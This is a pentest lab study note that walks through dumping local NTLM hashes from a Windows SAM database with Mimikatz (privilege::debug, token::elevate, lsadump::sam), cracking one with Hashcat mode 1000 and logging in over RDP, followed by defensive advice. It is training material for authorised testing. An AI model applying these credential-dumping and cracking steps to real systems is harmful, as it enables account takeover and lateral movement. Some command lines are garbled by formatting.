# Cracking NTLM Hashes  
  
## Overview  
  
NTLM hashes are widely used in Windows environments and are commonly encountered during penetration tests. They are especially important because they can often be extracted from Windows systems and cracked offline, or in some cases reused directly in attacks such as **Pass-the-Hash**.  
  
> [!info]  
> NTLM hashes are not the same as PINs. A Windows PIN is a local authentication convenience, whereas NTLM is a password hashing/authentication mechanism.  
  
---  
  
## Where Windows Stores Password Hashes  
  
Windows stores hashed local user passwords in the **Security Account Manager** database.  
  
```text  
C:\Windows\System32\config\SAM
```

The SAM database is used to authenticate local users.

However, the SAM file cannot normally be copied while Windows is running because the operating system places an exclusive lock on it.

---

## LM vs NTLM Hashes

Older Windows systems supported **LAN Manager**, or **LM**, hashes.

LM hashes are weak because:

- Passwords are case-insensitive.
- Passwords are limited to 14 characters.
- Passwords longer than 7 characters are split into two separate chunks.
- Each chunk is hashed separately.
- LM is based on DES.

Modern Windows systems use **NTLM hashes**, also commonly called **NTHashes**.

NTLM improves on LM because:

- Passwords are case-sensitive.
- Passwords are not split into smaller chunks.
- It is stronger than LM.

However, NTLM still has a major weakness:

> [!warning]  
> NTLM hashes stored in the SAM database are **not salted**.

---

## Why Unsalted Hashes Matter

A **salt** is random data added to a password before hashing.

Salts help defend against precomputed hash attacks, such as:

- Rainbow table attacks
- Large-scale hash lookup attacks
- Reuse of precomputed cracking data

Because NTLM hashes are unsalted, the same password always produces the same NTLM hash.

This makes NTLM hashes more vulnerable to offline cracking.

---

## Important Terminology

|Term|Meaning|
|---|---|
|SAM|Security Account Manager database storing local password hashes|
|LM|Older and weak Windows password hash format|
|NTLM / NTHash|Modern Windows password hash format|
|LSASS|Windows process responsible for authentication and credential handling|
|SYSTEM|Highly privileged Windows account|
|SeDebugPrivilege|Privilege that allows debugging of other processes|
|Pass-the-Hash|Attack where an NTLM hash is reused without cracking it|

---

## Why Mimikatz Is Used

The SAM file cannot normally be copied directly while Windows is running.

Instead, tools such as **Mimikatz** can be used in an authorised penetration test or lab environment to extract credentials and hashes from Windows.

Mimikatz can extract credentials from:

- SAM database
- LSASS process memory
- Cached logon sessions
- Other Windows credential stores

> [!important]  
> Mimikatz requires Administrator or SYSTEM-level privileges for most credential-dumping actions.

---

## LSASS and Privileges

**LSASS** stands for:

```
Local Security Authority Subsystem Service
```

LSASS handles:

- User authentication
- Password changes
- Access token creation
- Cached credentials

Because LSASS runs with very high privileges, extracting credentials from it usually requires:

- Local Administrator access
- `SeDebugPrivilege`
- SYSTEM-level privileges for some actions

---

## Lab Scenario

Target system:

```
MARKETINGWK01
192.168.50.210
```

Known credentials:

```
Username: offsec
Password: lab
```

Objective:

```
Extract and crack the NTLM hash for the local user nelly
```

---

## Step 1: Identify Local Users

On the Windows target, open PowerShell and run:

```
Get-LocalUser
```

Example output:

```
Name               Enabled Description
----               ------- -----------
Administrator      False   Built-in account for administering the computer/domain
DefaultAccount     False   A user account managed by the system.
Guest              False   Built-in account for guest access to the computer/domain
nelly              True
offsec             True
WDAGUtilityAccount False   A user account managed and used by the system...
```

This shows that a local user called `nelly` exists.

---

## Step 2: Start PowerShell as Administrator

Open PowerShell as Administrator.

Then change into the tools directory:

```
cd C:\tools
```

List the contents:

```
ls
```

Example:

```
Directory: C:\tools

Mode                 LastWriteTime         Length Name----                 -------------         ------ -----a----         5/31/2022  12:25 PM        1355680
mimikatz.exe
```

Start Mimikatz:

```
.\mimikatz.exe
```

You should now see the Mimikatz prompt:

```
mimikatz #
```

---

## Step 3: Enable Debug Privileges

Inside Mimikatz, enable `SeDebugPrivilege`:

```
privilege::debug
```

Expected output:

```
Privilege '20' OK
```

This confirms that debug privileges are enabled.

---

## Step 4: Elevate to SYSTEM

Still inside Mimikatz, elevate to SYSTEM:

```
token::elevate
```

Example output:

```
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

-> Impersonated !
```

This means Mimikatz is now impersonating the SYSTEM account.

---

## Step 5: Dump NTLM Hashes from SAM

Run:

```
lsadump::sam
```

Example output:

```
Domain : MARKETINGWK01
SysKey : 2a0e15573f9ce6cdd6a1c62d222035d5
Local SID : S-1-5-21-4264639230-2296035194-3358247000

RID  : 000003e9 (1001)
User : offsec  
	Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
	
RID  : 000003ea (1002)
User : nelly  
	Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
```

The target hash is:

```
3ae8e5f0ffabb3a627672e1600f1ba10
```

---

## Step 6: Save the Hash on Kali

On Kali, create a hash file:

```
nano nelly.hash
```

Add the NTLM hash:

```
3ae8e5f0ffabb3a627672e1600f1ba10
```

Confirm the file contents:

```
cat nelly.hash
```

Expected output:

```
3ae8e5f0ffabb3a627672e1600f1ba10
```

---

## Step 7: Identify the Correct Hashcat Mode

Search Hashcat modes for NTLM:

```
hashcat --help | grep -i "ntlm"
```

Relevant output:

```
5500  | NetNTLMv1 / NetNTLMv1+ESS
27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)
5600  | NetNTLMv227100 | NetNTLMv2 (NT)
1000  | NTLM
```

The correct Hashcat mode for NTLM is:

```
1000
```

---

## Step 8: Crack the NTLM Hash

Use Hashcat with the `rockyou.txt` wordlist and the `best66.rule` rule file:

```
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
```

Example cracked output:

```
3ae8e5f0ffabb3a627672e1600f1ba10:nicole1
```

The cracked password is:

```
nicole1
```

---

## Step 9: Confirm the Credentials

You can confirm the credentials by logging in via RDP:

```
Username: nelly
Password: nicole1
```

---

## Key Commands Summary

### Windows Target

```
Get-Local
Usercd C:\tools
.\mimikatz.exe
```

### Mimikatz

```
privilege::debug
token::elevate
lsadump::sam
```

### Kali

```bash
cat nelly.hash
hashcat --help | grep -i "ntlm"
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
```

---

## Hashcat NTLM Mode

|Hash Type|Hashcat Mode|
|---|---|
|NTLM|1000|
|NetNTLMv1|5500|
|NetNTLMv2|5600|

---

## NTLM vs NetNTLM

Do not confuse **NTLM** with **NetNTLM**.

|Type|Description|Example Use|
|---|---|---|
|NTLM|Stored password hash|Extracted from SAM|
|NetNTLMv1|Network authentication challenge-response|Captured over network|
|NetNTLMv2|Newer network authentication challenge-response|Captured with tools such as Responder|

For cracking SAM hashes, use:

```
-m 1000
```

For captured NetNTLMv2 hashes, use:

```
-m 5600
```

---

## Notes for Pentesting

During an authorised penetration test, NTLM hashes may be obtained from:

- Local SAM database
- LSASS memory
- Backup files
- Registry hives
- Domain controllers
- Misconfigured shares
- Credential dumping tools

Once obtained, NTLM hashes can sometimes be:

- Cracked offline
- Used for Pass-the-Hash
- Used to move laterally
- Used to identify password reuse

---

## Defensive Considerations

To reduce NTLM-related risk:

- Disable LM hashes.
- Reduce or disable NTLM where possible.
- Enforce strong password policies.
- Use long, unique passwords.
- Enable Credential Guard where supported.
- Restrict local administrator reuse.
- Monitor LSASS access.
- Enable attack surface reduction rules.
- Use LAPS or Windows LAPS for local admin passwords.
- Limit interactive logons for privileged accounts.

---

## Takeaways

- NTLM hashes are stored in the Windows SAM database.
- NTLM hashes are stronger than LM hashes but are still unsalted.
- Unsalted hashes are easier to crack offline.
- Mimikatz can extract NTLM hashes when run with sufficient privileges.
- Hashcat mode `1000` is used to crack NTLM hashes.
- Cracked credentials can often be used for lateral movement.
- Even uncracked NTLM hashes may still be useful in Pass-the-Hash attacks.

---

## Quick Reference

```
# Crack NTLM hash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Crack NTLM hash with rules
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule

# Show cracked hashes
hashcat -m 1000 hashes.txt --show
```

#nltm #password-cracking #mimikatz 